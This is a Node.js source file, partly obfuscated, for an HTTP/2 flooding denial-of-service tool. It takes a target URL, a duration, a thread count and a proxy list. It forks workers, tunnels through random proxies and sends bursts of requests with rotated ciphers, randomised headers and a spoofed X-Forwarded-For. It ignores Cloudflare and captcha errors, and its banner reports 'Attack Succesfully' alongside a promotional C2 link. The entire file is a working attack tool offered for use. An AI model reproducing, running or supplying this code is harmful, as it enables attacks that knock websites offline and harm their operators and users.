const url = require('url');
const fs = require('fs');
const http2 = require("http2");
const http = require('http');
const tls = require('tls');
const cluster = require("cluster");
const fakeua = require("fake-useragent");
const cplist = ["ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL", "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5", "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS", 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK'];
const accept_header = ["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8", "application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*", "text/html, application/xhtml+xml, image/jxr, */*", "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1", "application/javascript, */*;q=0.8", "text/html, text/plain; q=0.6, */*; q=0.1", "application/graphql, application/json; q=0.8, application/xml; q=0.7", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"];
const lang_header = ["he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5", "en-US,en;q=0.5", "en-US,en;q=0.9", 'de-CH;q=0.7', "da, en-gb;q=0.8, en;q=0.7", "cs;q=0.5"];
const encoding_header = ["gzip, deflate", "br;q=1.0, gzip;q=0.8, *;q=0.1", "gzip", "gzip, compress", "compress, deflate", "compress", "gzip, deflate, br", "deflate"];
const controle_header = ['max-age=604800', 'no-cache', 'no-store', 'no-transform', "only-if-cached", 'max-age=0', "no-cache, no-store,private, max-age=0, must-revalidate", "no-cache, no-store,private, s-maxage=604800, must-revalidate", "no-cache, no-store,private, max-age=604800, must-revalidate"];
const ignoreNames = ["RequestError", "StatusCodeError", "CaptchaError", "CloudflareError", "ParseError", "ParserError"];
const ignoreCodes = ["SELF_SIGNED_CERT_IN_CHAIN", 'ECONNRESET', "ERR_ASSERTION", "ECONNREFUSED", "EPIPE", "EHOSTUNREACH", "ETIMEDOUT", "ESOCKETTIMEDOUT", 'EPROTO'];
process.on('uncaughtException', function (_0x174c06) {
  if (_0x174c06.code && ignoreCodes.includes(_0x174c06.code) || _0x174c06.name && ignoreNames.includes(_0x174c06.name)) {
    return false;
  }
}).on('unhandledRejection', function (_0x4ef34e) {
  if (_0x4ef34e.code && ignoreCodes.includes(_0x4ef34e.code) || _0x4ef34e.name && ignoreNames.includes(_0x4ef34e.name)) {
    return false;
  }
}).on("warning", _0x2a9dc4 => {
  if (_0x2a9dc4.code && ignoreCodes.includes(_0x2a9dc4.code) || _0x2a9dc4.name && ignoreNames.includes(_0x2a9dc4.name)) {
    return false;
  }
}).setMaxListeners(0x0);
function accept() {
  return accept_header[Math.floor(Math.random() * accept_header.length)];
}
function lang() {
  return lang_header[Math.floor(Math.random() * lang_header.length)];
}
function encoding() {
  return encoding_header[Math.floor(Math.random() * encoding_header.length)];
}
function controling() {
  return controle_header[Math.floor(Math.random() * controle_header.length)];
}
function cipher() {
  return cplist[Math.floor(Math.random() * cplist.length)];
}
const target = process.argv[0x2];
const time = process.argv[0x3];
const thread = process.argv[0x4];
const proxys = fs.readFileSync(process.argv[0x5], "utf-8").toString().match(/\S+/g);
function proxyr() {
  return proxys[Math.floor(Math.random() * proxys.length)];
}
if (cluster.isMaster) {
  console.log("\x1B[36mURL: \x1B[37m" + url.parse(target).host + "\n\x1B[36mThread: \x1B[37m" + thread + "\n\x1B[36mTime: \x1B[37m" + time + "\n\x1B[36m@HaffizJembut\x1BAttack Succesfully \n\x1B https://dazenc2.my.id/ ");
  for (var bb = 0x0; bb < thread; bb++) {
    cluster.fork();
  }
  setTimeout(() => {
    process.exit(-0x1);
  }, time * 0x3e8);
} else {
  function flood() {
    var _0x253221 = url.parse(target);
    const _0x48a9a8 = fakeua();
    var _0x4771de = cplist[Math.floor(Math.random() * cplist.length)];
    var _0xe5bf4f = proxys[Math.floor(Math.random() * proxys.length)].split(':');
    var _0x137eed = {
      ':path': _0x253221.path,
      'X-Forwarded-For': _0xe5bf4f[0x0],
      'X-Forwarded-Host': _0xe5bf4f[0x0],
      ':method': "GET",
      'User-agent': _0x48a9a8,
      'Origin': target,
      'Accept': accept_header[Math.floor(Math.random() * accept_header.length)],
      'Accept-Encoding': encoding_header[Math.floor(Math.random() * encoding_header.length)],
      'Accept-Language': lang_header[Math.floor(Math.random() * lang_header.length)],
      'Cache-Control': controle_header[Math.floor(Math.random() * controle_header.length)]
    };
    const _0x5dd1d7 = new http.Agent({
      'keepAlive': true,
      'keepAliveMsecs': 0x4e20,
      'maxSockets': 0x0
    });
    var _0x399c2d = http.request({
      'host': _0xe5bf4f[0x0],
      'agent': _0x5dd1d7,
      'globalAgent': _0x5dd1d7,
      'port': _0xe5bf4f[0x1],
      'headers': {
        'Host': _0x253221.host,
        'Proxy-Connection': "Keep-Alive",
        'Connection': "Keep-Alive"
      },
      'method': 'CONNECT',
      'path': _0x253221.host + ":443"
    }, function () {
      _0x399c2d.setSocketKeepAlive(true);
    });
    _0x399c2d.on("connect", function (_0x5a3f5c, _0x55e92d, _0x32bb9b) {
      const _0x5e3082 = http2.connect(_0x253221.href, {
        'createConnection': () => tls.connect({
          'host': _0x253221.host,
          'ciphers': _0x4771de,
          'secureProtocol': 'TLS_method',
          'TLS_MIN_VERSION': "1.2",
          'TLS_MAX_VERSION': "1.3",
          'servername': _0x253221.host,
          'secure': true,
          'rejectUnauthorized': false,
          'ALPNProtocols': ['h2'],
          'socket': _0x55e92d
        }, function () {
          for (let _0x3b220d = 0x0; _0x3b220d < 0xc8; _0x3b220d++) {
            const _0x20f290 = _0x5e3082.request(_0x137eed);
            _0x20f290.setEncoding("utf8");
            _0x20f290.on("data", _0x3941e3 => {});
            _0x20f290.on("response", () => {
              _0x20f290.close();
            });
            _0x20f290.end();
          }
        })
      });
    });
    _0x399c2d.end();
  }
  setInterval(() => {
    flood();
  });
}
